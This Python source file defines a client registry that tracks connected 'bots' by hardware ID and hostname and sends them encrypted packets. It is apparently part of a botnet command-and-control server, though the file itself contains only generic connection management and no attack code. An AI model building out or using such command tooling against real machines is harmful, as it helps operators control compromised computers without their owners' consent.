import asyncio
import logging
from .protocol import write_packet

logger = logging.getLogger(__name__)


class ClientConnection:
    def __init__(self, hwid: str, addr, reader, writer, crypto):
        self.hwid = hwid
        self.addr = addr
        self.reader = reader
        self.writer = writer
        self.crypto = crypto
        self.session_id = ""
        self.info = {}


class Registry:
    def __init__(self):
        self._clients: dict[str, ClientConnection] = {}
        self._lock = asyncio.Lock()

    async def register(self, conn: ClientConnection):
        async with self._lock:
            self._clients[conn.hwid] = conn
            logger.info(f"Registered bot: {conn.hwid} ({conn.info.get('hostname', '?')})")

    async def unregister(self, hwid: str):
        async with self._lock:
            self._clients.pop(hwid, None)
            logger.info(f"Unregistered bot: {hwid}")

    async def get(self, hwid: str) -> ClientConnection | None:
        async with self._lock:
            return self._clients.get(hwid)

    async def list_all(self) -> list[ClientConnection]:
        async with self._lock:
            return list(self._clients.values())

    async def send_to(self, hwid: str, packet: dict) -> bool:
        conn = await self.get(hwid)
        if conn is None:
            return False
        try:
            await write_packet(conn.writer, conn.crypto, packet)
            return True
        except Exception as e:
            logger.error(f"Send to {hwid} failed: {e}")
            return False
